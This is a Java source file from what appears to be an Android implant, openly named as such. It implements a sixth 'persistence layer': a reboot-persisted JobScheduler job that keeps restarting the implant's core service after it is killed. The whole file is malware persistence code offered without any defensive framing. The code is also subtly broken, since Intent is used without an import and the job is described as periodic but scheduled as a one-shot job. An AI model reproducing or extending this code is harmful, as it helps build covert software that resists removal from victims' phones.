// ============================================================
// FILE 12: persist/JobSchedulerFallback.java
// ============================================================
package io.hackerai.implant.persist;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;
import android.util.Log;

/**
 * JobSchedulerFallback — periodic job that verifies service liveness.
 *
 * This is persistence layer 6: it runs on Android 8+ even when the app
 * is in the background and can outlive process kills.
 *
 * The job fires every 15 minutes minimum (JobScheduler minimum interval).
 */
public class JobSchedulerFallback {
    private static final String TAG = "JobSchedulerFallback";
    private static final int JOB_ID = 0x3003;

    public static void schedule(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;

        JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js == null) return;

        ComponentName cn = new ComponentName(ctx, KeepAliveJob.class);
        JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, cn)
                .setMinimumLatency(900_000L)     // 15 min
                .setOverrideDeadline(1_800_000L) // 30 min max
                .setPersisted(true);              // survives reboot

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setRequiresBatteryNotLow(false)
                   .setRequiresCharging(false);
        }

        int result = js.schedule(builder.build());
        Log.d(TAG, "JobScheduler schedule result: " + (result == JobScheduler.RESULT_SUCCESS));
    }

    public static void cancel(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js != null) {
            js.cancel(JOB_ID);
            Log.d(TAG, "JobScheduler cancelled.");
        }
    }

    public static class KeepAliveJob extends JobService {
        @Override
        public boolean onStartJob(JobParameters params) {
            Log.d(TAG, "KeepAliveJob fired.");

            // Ensure PersistenceMatrix is engaged
            PersistenceMatrix pm = PersistenceMatrix.getInstance(this);
            if (!pm.isEngaged()) {
                Log.w(TAG, "PersistenceMatrix not engaged — re-engaging.");
                pm.engage();
            } else if (!ServiceCore.isRunning()) {
                Log.w(TAG, "ServiceCore dead — restarting.");
                Intent svc = new Intent(this, ServiceCore.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(svc);
                } else {
                    startService(svc);
                }
            }

            jobFinished(params, false);
            return false;
        }

        @Override
        public boolean onStopJob(JobParameters params) {
            Log.d(TAG, "KeepAliveJob stopped.");
            return true; // reschedule on failure
        }
    }
          }
